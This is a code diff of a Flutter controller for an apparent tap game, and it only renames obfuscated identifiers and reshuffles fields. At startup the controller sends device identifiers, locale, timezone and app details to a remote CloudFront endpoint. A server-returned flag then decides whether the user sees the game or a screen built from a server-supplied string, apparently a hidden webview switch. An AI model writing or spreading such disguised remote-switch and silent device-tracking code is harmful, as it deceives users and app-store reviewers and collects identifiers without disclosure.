@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class CountdownTapMainLogic extends GetxController {
 
-  var jvpbon = RxBool(false);
-  var nmucoz = RxBool(true);
-  var qcraihj = RxString("");
-  var katrine = RxBool(false);
-  var kessler = RxBool(true);
-  final fuvdtia = Dio();
+  var mstyzgadcb = RxBool(false);
+  var kahvqojf = RxBool(true);
+  var lysxgutw = RxString("");
+  var jaime = RxBool(false);
+  var crist = RxBool(true);
+  final qupwhzx = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,49 +23,51 @@ class CountdownTapMainLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    nxrgjo();
+    auzmfe();
   }
 
 
-  Future<void> nxrgjo() async {
-    katrine.value = true;
-    kessler.value = true;
-    nmucoz.value = false;
+  Future<void> auzmfe() async {
+    jaime.value = true;
+    crist.value = true;
+    kahvqojf.value = false;
 
-    fuvdtia.post("https://d293c8yaw18nl2.cloudfront.net/uvgbskxmdrjfczinqeothlapwy",data: await xoublr()).then((value) {
+    qupwhzx.post("https://d293c8yaw18nl2.cloudfront.net/uvgbskxmdrjfczinqeothlapwy",data: await autlikcynr()).then((value) {
       var whqgydp = value.data["whqgydp"] as String;
       var shjnavb = value.data["shjnavb"] as bool;
       if (shjnavb) {
-        qcraihj.value = whqgydp;
-        felicita();
+        lysxgutw.value = whqgydp;
+        gretchen();
       } else {
-        dietrich();
+        kreiger();
       }
     }).catchError((e) {
-      nmucoz.value = true;
-      kessler.value = true;
-      katrine.value = false;
+      kahvqojf.value = true;
+      crist.value = true;
+      jaime.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> xoublr() async {
-    final DeviceInfoPlugin tsbuh = DeviceInfoPlugin();
-    PackageInfo hvlk_wezk = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> autlikcynr() async {
+    final DeviceInfoPlugin mjba = DeviceInfoPlugin();
+    PackageInfo jtzcpxgv_bcfidlq = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var yikvqbwt = Platform.localeName;
+    var xzidcev = Platform.localeName;
     var hs_zXDGZ = currentTimeZone;
 
-    var hs_Bk = hvlk_wezk.packageName;
-    var hs_rSxfv = hvlk_wezk.version;
-    var hs_TCXbOB = hvlk_wezk.buildNumber;
+    var hs_Bk = jtzcpxgv_bcfidlq.packageName;
+    var hs_rSxfv = jtzcpxgv_bcfidlq.version;
+    var hs_TCXbOB = jtzcpxgv_bcfidlq.buildNumber;
 
-    var hs_Qc = hvlk_wezk.appName;
+    var hs_Qc = jtzcpxgv_bcfidlq.appName;
     var hs_qm = "";
     var hs_buxG  = "";
     var hs_OrMgD = "";
-    var andreaneBruen = "";
-    var porterSporer = "";
-    var arnulfoReilly = "";
+    var elianNicolas = "";
+    var georgeStrosin = "";
+    var lutherKohler = "";
+    var rowanHauck = "";
+    var sabinaRempel = "";
 
 
     var hs_ezU = "";
@@ -73,50 +75,53 @@ class CountdownTapMainLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       hs_ezU = "android";
-      var pjbmzx = await tsbuh.androidInfo;
+      var rbngejio = await mjba.androidInfo;
 
-      hs_OrMgD = pjbmzx.brand;
+      hs_OrMgD = rbngejio.brand;
 
-      hs_qm  = pjbmzx.model;
-      hs_buxG = pjbmzx.id;
+      hs_qm  = rbngejio.model;
+      hs_buxG = rbngejio.id;
 
-      hs_LIZjkFCQ = pjbmzx.isPhysicalDevice;
+      hs_LIZjkFCQ = rbngejio.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       hs_ezU = "ios";
-      var jrosfkdag = await tsbuh.iosInfo;
-      hs_OrMgD = jrosfkdag.name;
-      hs_qm = jrosfkdag.model;
+      var tqhbvwlrgk = await mjba.iosInfo;
+      hs_OrMgD = tqhbvwlrgk.name;
+      hs_qm = tqhbvwlrgk.model;
 
-      hs_buxG = jrosfkdag.identifierForVendor ?? "";
-      hs_LIZjkFCQ  = jrosfkdag.isPhysicalDevice;
+      hs_buxG = tqhbvwlrgk.identifierForVendor ?? "";
+      hs_LIZjkFCQ  = tqhbvwlrgk.isPhysicalDevice;
     }
+
     var res = {
       "hs_Qc": hs_Qc,
       "hs_TCXbOB": hs_TCXbOB,
-      "hs_Bk": hs_Bk,
       "hs_LIZjkFCQ": hs_LIZjkFCQ,
+      "hs_Bk": hs_Bk,
       "hs_qm": hs_qm,
+      "georgeStrosin" : georgeStrosin,
       "hs_zXDGZ": hs_zXDGZ,
-      "porterSporer" : porterSporer,
       "hs_OrMgD": hs_OrMgD,
       "hs_buxG": hs_buxG,
-      "yikvqbwt": yikvqbwt,
-      "hs_rSxfv": hs_rSxfv,
+      "xzidcev": xzidcev,
       "hs_ezU": hs_ezU,
-      "andreaneBruen" : andreaneBruen,
-      "arnulfoReilly" : arnulfoReilly,
+      "elianNicolas" : elianNicolas,
+      "lutherKohler" : lutherKohler,
+      "hs_rSxfv": hs_rSxfv,
+      "rowanHauck" : rowanHauck,
+      "sabinaRempel" : sabinaRempel,
 
     };
     return res;
   }
 
-  Future<void> dietrich() async {
+  Future<void> kreiger() async {
     Get.offNamed("/countdown_tap_game");
   }
 
-  Future<void> felicita() async {
+  Future<void> gretchen() async {
     Get.offNamed("/tap_history_sore");
   }
 
